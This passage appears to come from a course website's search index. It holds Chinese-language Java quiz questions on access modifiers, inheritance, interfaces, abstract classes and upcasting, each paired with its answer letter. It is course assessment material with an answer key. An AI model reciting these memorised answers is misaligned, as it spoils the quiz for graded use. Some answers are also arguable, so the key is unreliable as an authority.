. foo ( 123 , 123 ); System . out . println ( \"outer\" ); } } A. in the Inner outer B. outer C. in the Inner D. \u7f16\u8bd1\u4e0d\u901a\u8fc7","title":"\u8fd0\u884c\u4e0b\u5217\u7a0b\u5e8f\uff0c\u4f1a\u4ea7\u751f\u4ec0\u4e48\u7ed3\u679c\uff1a"},{"location":"uooc/java/3/#_36","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#_37","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class Ref { public static void main ( String argv []){ Ref r = new Ref (); r . amethod ( r ); } public void amethod ( Ref r ){ int i = 99 ; multi ( r ); System . out . println ( i ); } public void multi ( Ref r ){ r . i = r . i * 2 ; } } A. \u7f16\u8bd1\u9519\u8bef B. \u8f93\u51fa99 C. \u8f93\u51fa198 D. \u8fd0\u884c\u65f6\u51fa\u9519","title":"\u7f16\u8bd1\u53ca\u8fd0\u884c\u4ee5\u4e0b\u4ee3\u7801\uff0c\u4e0b\u5217\u9009\u9879\u54ea\u4e2a\u662f\u6b63\u786e\u7684\uff1f"},{"location":"uooc/java/3/#_38","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#38","text":"","title":"3.8 \u8bbf\u95ee\u6743\u9650"},{"location":"uooc/java/3/#this","text":"A. \u5f53\u524d\u5bf9\u8c61\u6307\u9488 B. \u5f53\u524d\u7c7b\u7684\u5b9e\u4f8b\u5bf9\u8c61 C. \u5f53\u524d\u5bf9\u8c61\u5f15\u7528 D. \u5f53\u524d\u7c7b\u7684\u65b9\u6cd5","title":"this\u5173\u952e\u5b57\u6307\u7684\u662f\uff1f"},{"location":"uooc/java/3/#_39","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#_40","text":"A. private B. public C. protected D. no modifier","title":"\u5982\u679c\u7c7b\u4e2d\u7684\u6210\u5458\u53d8\u91cf\u4ec5\u4ec5\u53ef\u4ee5\u88ab\u540c\u4e00\u5305\u4e2d\u5176\u4ed6\u7c7b\u8bbf\u95ee\uff0c\u5219\u4f7f\u7528\u5982\u4e0b\u54ea\u4e2a\u7ea6\u675f\u7b26?"},{"location":"uooc/java/3/#_41","text":"D","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#_42","text":"A. public B. private C. protected D. transient","title":"\u5982\u679c\u4efb\u4f55\u5305\u4e2d\u7684\u5b50\u7c7b\u90fd\u80fd\u8bbf\u95ee\u8d85\u7c7b\u4e2d\u7684\u6210\u5458\uff0c\u90a3\u4e48\u8d85\u7c7b\u4e2d\u7684\u6210\u5458\u4f7f\u7528\u54ea\u4e2a\u9650\u5b9a\u8bcd\u6700\u597d\uff1f"},{"location":"uooc/java/3/#_43","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#_44","text":"A. public B. private C. static D. protected","title":"\u4e0d\u5141\u8bb8\u4f5c\u4e3a\u7c7b\u53ca\u7c7b\u6210\u5458\u7684\u8bbf\u95ee\u63a7\u5236\u7b26\u7684\u662f:"},{"location":"uooc/java/3/#_45","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#_46","text":"A. protected B. static C. private D. public","title":"\u4e0b\u9762\u54ea\u4e2a\u4fee\u9970\u7b26\u4fee\u9970\u7684\u65b9\u6cd5\u53ea\u80fd\u88ab\u672c\u7c7b\u4e2d\u7684\u5176\u4ed6\u65b9\u6cd5\u4f7f\u7528"},{"location":"uooc/java/3/#_47","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#_48","text":"A. \u53d8\u91cf\u5e94\u8be5\u7528public\u505a\u4fee\u9970\u3002 B. \u53d8\u91cf\u5e94\u8be5\u7528private\u505a\u4fee\u9970\u3002 C. \u53d8\u91cf\u5e94\u8be5\u7528protected\u505a\u4fee\u9970\u3002 D. \u53d8\u91cf\u4e0d\u9700\u505a\u4efb\u4f55\u4fee\u9970\u3002","title":"\u67d0\u4e2a\u7c7b\u7684\u6210\u5458\u53d8\u91cf\u53ef\u4ee5\u88ab\u540c\u4e00\u4e2a\u5305\u4e2d\u7684\u5b50\u7c7b\u8bbf\u95ee\uff0c\u4f46\u4e0d\u80fd\u88ab\u53e6\u4e00\u4e2a\u5305\u4e2d\u7684\u7c7b\uff08\u542b\u5b50\u7c7b\uff09\u8bbf\u95ee\uff0c\u8be5\u5982\u4f55\u5b9a\u4e49\uff1f"},{"location":"uooc/java/3/#_49","text":"D","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#private","text":"A. \u53ef\u4ee5\u88ab\u4e09\u79cd\u7c7b\u6240\u5f15\u7528\uff1a\u8be5\u7c7b\u81ea\u8eab\u3001\u4e0e\u5b83\u5728\u540c\u4e00\u4e2a\u5305\u4e2d\u7684\u5176\u4ed6\u7c7b\u3001\u5728\u5176\u4ed6\u5305\u4e2d\u7684\u8be5\u7c7b\u7684\u5b50\u7c7b B. \u53ef\u4ee5\u88ab\u4e24\u79cd\u7c7b\u8bbf\u95ee\u548c\u5f15\u7528\uff1a\u8be5\u7c7b\u672c\u8eab\u3001\u8be5\u7c7b\u7684\u6240\u6709\u5b50\u7c7b C. \u53ea\u80fd\u88ab\u8be5\u7c7b\u81ea\u8eab\u6240\u8bbf\u95ee\u548c\u4fee\u6539 D. \u53ea\u80fd\u88ab\u540c\u4e00\u4e2a\u5305\u4e2d\u7684\u7c7b\u8bbf\u95ee","title":"\u5173\u4e8e\u88ab\u79c1\u6709\u8bbf\u95ee\u63a7\u5236\u7b26private\u4fee\u9970\u7684\u6210\u5458\u53d8\u91cf\uff0c\u4ee5\u4e0b\u8bf4\u6cd5\u6b63\u786e\u7684\u662f\uff1a"},{"location":"uooc/java/3/#_50","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#39","text":"","title":"3.9 \u5185\u90e8\u7c7b\u7b80\u4ecb"},{"location":"uooc/java/3/#a","text":"1 2 3 4 5 6 public class A { public int x = 1 ; public void increaseBy ( int n ){ x = x + n ; } }","title":"\u8003\u8651\u7c7bA:"},{"location":"uooc/java/3/#4","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 A . A a = new A (); a . x = 3 + a . x ; System . out . print ( a . x ); B . A a = new A (); a . increaseBy ( 2 ); a . increaseBy ( 1 ); System . out . print ( a . x ); C . A a = new A (){ public void increaseBy ( int n ) { super . increaseBy ( n ); } }; a . increaseBy ( 4 ); System . out . print ( a . x ); D . A a = new A (); a . increaseBy ( 3 ); System . out . print ( a . x );","title":"\u4ee5\u4e0b\u54ea\u4e2a\u9009\u9879\u7a0b\u5e8f\u4ee3\u7801\u6bb5\u4e0d\u4f1a\u8f93\u51fa4\uff1f"},{"location":"uooc/java/3/#_51","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#310","text":"","title":"3.10 \u5305\u7684\u5e94\u7528"},{"location":"uooc/java/3/#_52","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 1 ) import java.awt.* ; package Mypackage ; class Myclass {} 2 ) package MyPackage ; import java.awt.* ; class MyClass {} 3 ) /*This is a comment */ package MyPackage ; import java.awt.* ; class MyClass {} A. 1\uff09\u548c2\uff09 B. 2\uff09\u548c3\uff09 C. 1\uff09\u548c3\uff09 D. 1\uff09\u30012\uff09\u548c3\uff09","title":"\u4ee5\u4e0b\u54ea\u51e0\u6bb5\u4ee3\u7801\u53ef\u4ee5\u6210\u529f\u7f16\u8bd1\uff1f"},{"location":"uooc/java/3/#_53","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/#mypackage","text":"A. import MyPackage ; B. import package MyPackage ; C. package MyPackage ; D. package import MyPackage ;","title":"\u521b\u5efa\u4e00\u4e2a\u540d\u4e3aMyPackage\u5305\u7684\u8bed\u53e5\u6b63\u786e\u7684\u662f\uff1a"},{"location":"uooc/java/3/#_54","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/","text":"4.1 \u7ee7\u627f\u6982\u5ff5 \u4e0b\u5217\u5173\u4e8e\u7ee7\u627f\u7684\u54ea\u9879\u53d9\u8ff0\u662f\u6b63\u786e\u7684\uff1f A. \u5728java\u4e2d\u5141\u8bb8\u591a\u91cd\u7ee7\u627f B. \u5728java\u4e2d\u4e00\u4e2a\u7c7b\u53ea\u80fd\u5b9e\u73b0\u4e00\u4e2a\u63a5\u53e3 C. \u5728java\u4e2d\u4e00\u4e2a\u7c7b\u4e0d\u80fd\u540c\u65f6\u7ee7\u627f\u4e00\u4e2a\u7c7b\u548c\u5b9e\u73b0\u4e00\u4e2a\u63a5\u53e3 D. java\u7684\u5355\u4e00\u7ee7\u627f\u4f7f\u4ee3\u7801\u66f4\u53ef\u9760 \u89e3\u51b3\u65b9\u6848 D \u7ed9\u51fa\u4e0b\u9762\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 1 ) class Parent { 2 ) private String name ; 3 ) public Parent (){} 4 ) } 5 ) public class Child extends Parent { 6 ) private String department ; 7 ) public Child () {} 8 ) public String getValue () { return name ; } 9 ) public static void main ( String arg []) { 10 ) Parent p = new Parent (); 11 ) } 12 ) } \u54ea\u4e9b\u4ee3\u7801\u884c\u5c06\u5f15\u8d77\u9519\u8bef\uff1f A. \u7b2c3\u884c B. \u7b2c6\u884c C. \u7b2c7\u884c D. \u7b2c8\u884c \u89e3\u51b3\u65b9\u6848 D \u8bbe\u6709\u4e0b\u9762\u4e24\u4e2a\u7c7b\u7684\u5b9a\u4e49\uff1a 1 2 3 4 5 6 7 8 9 class Person { class Student extends Person { long id ; // \u8eab\u4efd\u8bc1\u53f7 int score ; // \u5165\u5b66\u603b\u5206 String name ; // \u59d3\u540d int getScore (){ return score ; } } } \u7c7bPerson\u548c\u7c7bStudent\u7684\u5173\u7cfb\u662f\uff1a A. \u5305\u542b\u5173\u7cfb B. \u7ee7\u627f\u5173\u7cfb\uff08\u5185\u90e8\u7c7b\u7ee7\u627f\u4e86\u5916\u90e8\u7c7b\uff09 C. \u5173\u8054\u5173\u7cfb D. \u65e0\u5173\u7cfb\uff0c\u4e0a\u8ff0\u7c7b\u5b9a\u4e49\u6709\u8bed\u6cd5\u9519\u8bef \u89e3\u51b3\u65b9\u6848 B \u6784\u9020\u65b9\u6cd5\u4e0d\u80fd\u88ab\u7ee7\u627f\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 A \u4e00\u4e2a\u5b50\u7c7b\u53ef\u4ee5\u91cd\u65b0\u5b9a\u4e49\u4ece\u7236\u7c7b\u90a3\u91cc\u7ee7\u627f\u6765\u7684\u540c\u540d\u65b9\u6cd5\uff0c\u800c\u4e14\u5141\u8bb8\u5b83\u4eec\u6709\u4e0d\u540c\u7684\u8fd4\u56de\u503c\u7c7b\u578b\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 B 4.2 \u6210\u5458\u53d8\u91cf/\u65b9\u6cd5 \u770b\u4e0b\u9762\u4e00\u6bb5\u7a0b\u5e8f\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Aclass { void go (){ System . out . println ( \"Aclass\" ); } } public class Bclass extends Aclass { void go (){ System . out . println ( \"Bclass\" ); } public static void main ( String args []){ Aclass a = new Aclass (); Aclass a1 = new Bclass (); a . go (); a1 . go (); } } \u4ee5\u4e0a\u7a0b\u5e8f\u8fd0\u884c\u7ed3\u679c\u662f\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 A . Aclass Aclass B . Bclass Bclass C . Aclass Bclass D . Bclass Aclass \u89e3\u51b3\u65b9\u6848 C \u5728Java\u4e2d\uff0c\u4ee5\u4e0b\u5173\u4e8e\u65b9\u6cd5\u91cd\u8f7d\u548c\u65b9\u6cd5\u91cd\u5b9a\u4e49\u63cf\u8ff0\u6b63\u786e\u7684\u662f\uff1f A. \u65b9\u6cd5\u91cd\u8f7d\u548c\u65b9\u6cd5\u7684\u91cd\u5b9a\u4e49\u5b9e\u73b0\u7684\u529f\u80fd\u76f8\u540c B. \u65b9\u6cd5\u91cd\u8f7d\u51fa\u73b0\u5728\u7236\u5b50\u5173\u7cfb\u4e2d\uff0c\u65b9\u6cd5\u91cd\u5b9a\u4e49\u662f\u5728\u540c\u4e00\u7c7b\u4e2d C. \u65b9\u6cd5\u91cd\u8f7d\u7684\u8fd4\u56de\u503c\u7c7b\u578b\u5fc5\u987b\u4e00\u81f4\uff0c\u53c2\u6570\u9879\u5fc5\u987b\u4e0d\u540c D. \u65b9\u6cd5\u91cd\u5b9a\u4e49\u7684\u8fd4\u56de\u503c\u7c7b\u578b\u5fc5\u987b\u76f8\u540c\u6216\u76f8\u5bb9\u3002 \u89e3\u51b3\u65b9\u6848 D \u65b9\u6cd5\u7684\u8986\u76d6\u662f\u5728\u5b50\u7c7b\u4e2d\u518d\u6b21\u5b9e\u73b0\u7236\u7c7b\u4e2d\u5df2\u7ecf\u5b9e\u73b0\u8fc7\u7684\u65b9\u6cd5\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 A \u53ef\u4ee5\u7528final\u8bf4\u660e\u53d8\u91cf\u4e3a\u4e00\u4e2a\u5e38\u91cf\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 A \u88abfinal\u4fee\u9970\u7b26\u4fee\u9970\u7684\u7c7b\uff0c\u4e0d\u80fd\u88ab\u7ee7\u627f\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 A \u6700\u7ec8\u7c7b\u4e0d\u80fd\u6d3e\u751f\u5b50\u7c7b\uff0c\u4f46\u6700\u7ec8\u65b9\u6cd5\u53ef\u4ee5\u88ab\u8986\u76d6\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 B 4.3 super\u5173\u952e\u5b57 \u5982\u679c\u5b50\u7c7b\u8981\u521d\u59cb\u5316\u7236\u7c7b\u7684\u7c7b\u53d8\u91cf\uff0c\u8c03\u7528super\u8bed\u53e5\u5fc5\u987b\uff1a A. \u653e\u5728\u5b50\u7c7b\u6784\u9020\u65b9\u6cd5\u7b2c\u4e00\u6761\u8bed\u53e5 B. \u653e\u5728\u5b50\u7c7b\u6784\u9020\u65b9\u6cd5\u4efb\u4f55\u4f4d\u7f6e C. \u53ef\u4ee5\u91c7\u7528\u521d\u59cb\u5316\u5217\u8868\u65b9\u5f0f\u6267\u884c D. \u53ef\u4ee5\u8c03\u7528this\u5173\u952e\u5b57 \u89e3\u51b3\u65b9\u6848 A this\u548csuper\u90fd\u53ef\u4ee5\u5728main()\u65b9\u6cd5\u4e2d\u4f7f\u7528 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 B 4.4 \u4e0a\u8f6c\u578b\u5bf9\u8c61 \u8003\u8651\u4ee5\u4e0b\u4e24\u4e2a\u7c7b: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public class UpByOne { private int num = 0 ; public int getNum () { return num ; } public void setNum ( int x ) { num = x ; } public void up () { num = num + 1 ; } } class UpByTwo extends UpByOne { public void up () { // missing code goes here } } \u5728\u7c7bUpByTwo\u4e2d,\u91cd\u5b9a\u4e49\u65b9\u6cd5\u65b9\u6cd5up()\uff0c\u4f7f\u5f97num\u52a02\uff0c\u4ee5\u4e0b\u54ea\u6bb5\u4ee3\u7801\u6700\u5408\u9002\u586b\u8865\u7701\u6389\u7684\u4ee3\u7801\uff1f A. num = num + 2; B. super.up(); super.up(); C. setNum(getNum()) + 2; D. super.up() + 1; \u89e3\u51b3\u65b9\u6848 B \u5047\u8bbe\u7c7bBaseWidget\u662f\u7c7bTypeAWidget\u7684\u7236\u7c7b\uff0c\u5e76\u4e14\u5728\u7c7bTypeAWidget\u4e2d\u91cd\u5199\u4e86\u65b9\u6cd5speak()\uff0c\u90a3\u4e48\u4e0b\u5217\u54ea\u4e2a\u7a0b\u5e8f\u7247\u6bb5\u80fd\u6b63\u786e\u7f16\u8bd1\u6267\u884c\uff1f A. Object A=new BaseWidget(); A.speak(); B. BaseWidget B=new TypeAWidget(); B.speak(); C. TypeAWidget C=new BaseWidget(); D. speak(); \u89e3\u51b3\u65b9\u6848 B \u4e0a\u8f6c\u578b\u5bf9\u8c61\u53ef\u4ee5\u8c03\u7528\u5b50\u7c7b\u4e2d\u57fa\u7c7b\u88ab\u8986\u76d6\u7684\u65b9\u6cd5\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 A \u4e0a\u8f6c\u578b\u5bf9\u8c61\u53ef\u4ee5\u8c03\u7528\u5b50\u7c7b\u4e2d\u65b0\u7684\u65b9\u6cd5\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 B Java\u8bed\u8a00\u91cc\u7684\u4e0a\u8f6c\u578b\u5bf9\u8c61\u4e5f\u5373\u662f\u6240\u8c13\u7684\u7236\u7c7b\u7ed9\u5b50\u7c7b\u5bf9\u8c61\u8d4b\u503c\u800c\u5df2 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 B Java\u4e0d\u5141\u8bb8\u4e0a\u8f6c\u578b\u5bf9\u8c61\u518d\u91cd\u65b0\u7ed9\u5b50\u7c7b\u5bf9\u8c61\u8d4b\u503c\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 B 4.5 \u62bd\u8c61\u7c7b \u7f16\u8bd1\u53ca\u8fd0\u884c\u4ee5\u4e0b\u4ee3\u7801\uff0c\u4e0b\u5217\u9009\u9879\u54ea\u4e2a\u662f\u6b63\u786e\u7684\uff1f 1 2 3 4 5 6 7 8 9 10 11 abstract class MineBase { abstract void amethod (); static int i ; } public class Mine extends MineBase { public static void main ( String argv []){ int [] ar = new int [ 5 ]; for ( i = 0 ; i < ar . length ; i ++) System . out . println ( ar [ i ]); } } A. \u7a0b\u5e8f\u6b63\u786e\uff0c\u6ca1\u6709\u62a5\u9519\uff0c\u5e76\u4e14\u8f93\u51fa\u5305\u542b5\u4e2a0\u7684\u5e8f\u5217 B. Error: ar is used before it is initialized C. Error Mine must be declared abstract D. IndexOutOfBoundes Error \u89e3\u51b3\u65b9\u6848 C \u542b\u6709\u62bd\u8c61\u65b9\u6cd5\u7684\u7c7b\u5fc5\u987b\u58f0\u660e\u4e3a\u62bd\u8c61\u7c7b\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 A \u62bd\u8c61\u7c7b\u53ef\u4ee5\u7528\u6765\u5b9a\u4e49\u5bf9\u8c61\uff0c\u4e5f\u53ef\u4ee5\u88ab\u7ee7\u627f\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 B \u4e00\u4e2a\u62bd\u8c61\u7c7b\u4e2d\u7684\u6240\u6709\u65b9\u6cd5\u90fd\u5fc5\u987b\u662f\u62bd\u8c61\u7684\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 B 4.6 \u63a5\u53e3 interface\u53ef\u4ee5\u88ab\u4ee5\u4e0b\u54ea\u4e2a\u4fee\u9970\u7b26\u4fee\u9970\uff1f A. private B. class C. public D. static \u89e3\u51b3\u65b9\u6848 C \u5173\u4e8e\u63a5\u53e3\u7684\u5b9a\u4e49\u548c\u5b9e\u73b0\uff0c\u4ee5\u4e0b\u63cf\u8ff0\u6b63\u786e\u7684\u662f: A. \u63a5\u53e3\u5b9a\u4e49\u7684\u65b9\u6cd5\u53ea\u6709\u5b9e\u73b0 B. \u63a5\u53e3\u4e2d\u7684\u53d8\u91cf\u9ed8\u8ba4\u662fpublic\u3001final\u548cstatic\u7684 C. \u5982\u679c\u4e00\u4e2a\u63a5\u53e3\u7531\u591a\u4e2a\u7c7b\u6765\u5b9e\u73b0\uff0c\u5219\u8fd9\u4e9b\u7c7b\u5728\u5b9e\u73b0\u8be5\u63a5\u53e3\u4e2d\u7684\u65b9\u6cd5\u65f6\u91c7\u7528\u7edf\u4e00\u7684\u4ee3\u7801 D. \u5982\u679c\u4e00\u4e2a\u7c7b\u5b9e\u73b0\u4e86\u63a5\u53e3\uff0c\u5219\u5fc5\u987b\u5b9e\u73b0\u8be5\u63a5\u53e3\u4e2d\u7684\u6240\u6709\u65b9\u6cd5\uff0c\u4f46\u65b9\u6cd5\u53ef\u4e0d\u4e3apublic \u89e3\u51b3\u65b9\u6848 B \u5173\u4e8e\u63a5\u53e3\u4e0b\u9762\u4e0d\u6b63\u786e\u7684\u8bf4\u6cd5\u662f\uff1a A. \u63a5\u53e3\u4e0d\u652f\u6301\u591a\u91cd\u7ee7\u627f B. \u63a5\u53e3\u6240\u6709\u65b9\u6cd5\u662f\u62bd\u8c61\u7684 C. \u63a5\u53e3\u91cc\u7684\u65b9\u6cd5\u8bbf\u95ee\u5c5e\u6027\u5747\u4e3apublic D. \u5b9e\u73b0\u63a5\u53e3\u7684\u5173\u952e\u5b57\u662fimplements \u89e3\u51b3\u65b9\u6848 A \u4e00\u4e2a\u7c7b\u53ea\u80fd\u7ee7\u627f\u5355\u4e2a\u7236\u7c7b\uff0c\u4e00\u4e2a\u7c7b\u53ea\u80fd\u5b9e\u73b0\u4e00\u4e2a\u63a5\u53e3\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 B \u63a5\u53e3\u4e0d\u80fd\u58f0\u660e\u6784\u9020\u51fd\u6570\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 A 4.7 \u63a5\u53e3\u56de\u8c03 \u7ed9\u5b9a\u4ee5\u4e0b\u7a0b\u5e8f\u7247\u6bb5\uff0c\u7ed3\u679c\u4e3a\uff1f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 interface InterfaceA { String s = \"Hello\" ; void f (); } class ClassA implements InterfaceA { public void f (){ System . out . print ( s ); } } class ClassB { void g ( InterfaceA a ){ a . f (); } } public class E { public static void main ( String [] args ) { ClassB b = new ClassB (); b . g ( new ClassA ()); } } A. Hello B. \u7f16\u8bd1\u6b63\u786e\uff0c\u4f46\u65e0\u8fd0\u884c\u7ed3\u679c C. \u7f16\u8bd1\u9519\u8bef\uff1ab.g(new ClassA()) D. \u4ee5\u4e0a\u90fd\u4e0d\u5bf9 \u89e3\u51b3\u65b9\u6848 A \u7ed9\u5b9a\u5982\u4e0b\u7a0b\u5e8f\uff0c\u8fd0\u884c\u7ed3\u679c\u4e3a\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 interface B { void f (); } class A implements B { public void f (){ System . out . println ( \"I love java\uff01\" ); } public static void main ( String [] args ) { B b = new A (); b . f (); } } A. \u6267\u884c\u9519\u8bef B. I love java\uff01 C. \u7f16\u8bd1\u9519\u8bef D. \u4ee5\u4e0a\u90fd\u4e0d\u5bf9 \u89e3\u51b3\u65b9\u6848 B \u7ed9\u51fa\u5982\u4e0b\u7a0b\u5e8f\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 interface InterfaceA { String s = \"good \" ; void f (); } abstract class ClassA { abstract void g (); } class ClassB extends ClassA implements InterfaceA { void g (){ System . out . print ( s ); } public void f (){ System . out . print ( \" \" + s ); } } public class E { public static void main ( String [] args ) { ClassA a = new ClassB (); InterfaceA b = new ClassB (); a . g (); b . f (); } } \u5176\u8fd0\u884c\u7ed3\u679c\u662f\uff1f A. \u7f16\u8bd1\u6b63\u786e\uff0c\u4f46\u65e0\u8fd0\u884c\u7ed3\u679c B. \u7f16\u8bd1\u9519\u8bef\uff1aInterfaceA b=new ClassB(); C. good good D. \u4ee5\u4e0a\u90fd\u4e0d\u5bf9 \u89e3\u51b3\u65b9\u6848 C","title":"4 \u7ee7\u627f\u4e0e\u63a5\u53e3"},{"location":"uooc/java/4/#41","text":"","title":"4.1 \u7ee7\u627f\u6982\u5ff5"},{"location":"uooc/java/4/#_1","text":"A. \u5728java\u4e2d\u5141\u8bb8\u591a\u91cd\u7ee7\u627f B. \u5728java\u4e2d\u4e00\u4e2a\u7c7b\u53ea\u80fd\u5b9e\u73b0\u4e00\u4e2a\u63a5\u53e3 C. \u5728java\u4e2d\u4e00\u4e2a\u7c7b\u4e0d\u80fd\u540c\u65f6\u7ee7\u627f\u4e00\u4e2a\u7c7b\u548c\u5b9e\u73b0\u4e00\u4e2a\u63a5\u53e3 D. java\u7684\u5355\u4e00\u7ee7\u627f\u4f7f\u4ee3\u7801\u66f4\u53ef\u9760","title":"\u4e0b\u5217\u5173\u4e8e\u7ee7\u627f\u7684\u54ea\u9879\u53d9\u8ff0\u662f\u6b63\u786e\u7684\uff1f"},{"location":"uooc/java/4/#_2","text":"D","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#_3","text":"1 2 3 4 5 6 7 8 9 10 11 12 1 ) class Parent { 2 ) private String name ; 3 ) public Parent (){} 4 ) } 5 ) public class Child extends Parent { 6 ) private String department ; 7 ) public Child () {} 8 ) public String getValue () { return name ; } 9 ) public static void main ( String arg []) { 10 ) Parent p = new Parent (); 11 ) } 12 ) }","title":"\u7ed9\u51fa\u4e0b\u9762\u4ee3\u7801\uff1a"},{"location":"uooc/java/4/#_4","text":"A. \u7b2c3\u884c B. \u7b2c6\u884c C. \u7b2c7\u884c D. \u7b2c8\u884c","title":"\u54ea\u4e9b\u4ee3\u7801\u884c\u5c06\u5f15\u8d77\u9519\u8bef\uff1f"},{"location":"uooc/java/4/#_5","text":"D","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#_6","text":"1 2 3 4 5 6 7 8 9 class Person { class Student extends Person { long id ; // \u8eab\u4efd\u8bc1\u53f7 int score ; // \u5165\u5b66\u603b\u5206 String name ; // \u59d3\u540d int getScore (){ return score ; } } }","title":"\u8bbe\u6709\u4e0b\u9762\u4e24\u4e2a\u7c7b\u7684\u5b9a\u4e49\uff1a"},{"location":"uooc/java/4/#personstudent","text":"A. \u5305\u542b\u5173\u7cfb B. \u7ee7\u627f\u5173\u7cfb\uff08\u5185\u90e8\u7c7b\u7ee7\u627f\u4e86\u5916\u90e8\u7c7b\uff09 C. \u5173\u8054\u5173\u7cfb D. \u65e0\u5173\u7cfb\uff0c\u4e0a\u8ff0\u7c7b\u5b9a\u4e49\u6709\u8bed\u6cd5\u9519\u8bef","title":"\u7c7bPerson\u548c\u7c7bStudent\u7684\u5173\u7cfb\u662f\uff1a"},{"location":"uooc/java/4/#_7","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#_8","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u6784\u9020\u65b9\u6cd5\u4e0d\u80fd\u88ab\u7ee7\u627f\u3002"},{"location":"uooc/java/4/#_9","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#_10","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u4e00\u4e2a\u5b50\u7c7b\u53ef\u4ee5\u91cd\u65b0\u5b9a\u4e49\u4ece\u7236\u7c7b\u90a3\u91cc\u7ee7\u627f\u6765\u7684\u540c\u540d\u65b9\u6cd5\uff0c\u800c\u4e14\u5141\u8bb8\u5b83\u4eec\u6709\u4e0d\u540c\u7684\u8fd4\u56de\u503c\u7c7b\u578b\u3002"},{"location":"uooc/java/4/#_11","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#42","text":"","title":"4.2 \u6210\u5458\u53d8\u91cf/\u65b9\u6cd5"},{"location":"uooc/java/4/#_12","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Aclass { void go (){ System . out . println ( \"Aclass\" ); } } public class Bclass extends Aclass { void go (){ System . out . println ( \"Bclass\" ); } public static void main ( String args []){ Aclass a = new Aclass (); Aclass a1 = new Bclass (); a . go (); a1 . go (); } }","title":"\u770b\u4e0b\u9762\u4e00\u6bb5\u7a0b\u5e8f\uff1a"},{"location":"uooc/java/4/#_13","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 A . Aclass Aclass B . Bclass Bclass C . Aclass Bclass D . Bclass Aclass","title":"\u4ee5\u4e0a\u7a0b\u5e8f\u8fd0\u884c\u7ed3\u679c\u662f\uff1a"},{"location":"uooc/java/4/#_14","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#java","text":"A. \u65b9\u6cd5\u91cd\u8f7d\u548c\u65b9\u6cd5\u7684\u91cd\u5b9a\u4e49\u5b9e\u73b0\u7684\u529f\u80fd\u76f8\u540c B. \u65b9\u6cd5\u91cd\u8f7d\u51fa\u73b0\u5728\u7236\u5b50\u5173\u7cfb\u4e2d\uff0c\u65b9\u6cd5\u91cd\u5b9a\u4e49\u662f\u5728\u540c\u4e00\u7c7b\u4e2d C. \u65b9\u6cd5\u91cd\u8f7d\u7684\u8fd4\u56de\u503c\u7c7b\u578b\u5fc5\u987b\u4e00\u81f4\uff0c\u53c2\u6570\u9879\u5fc5\u987b\u4e0d\u540c D. 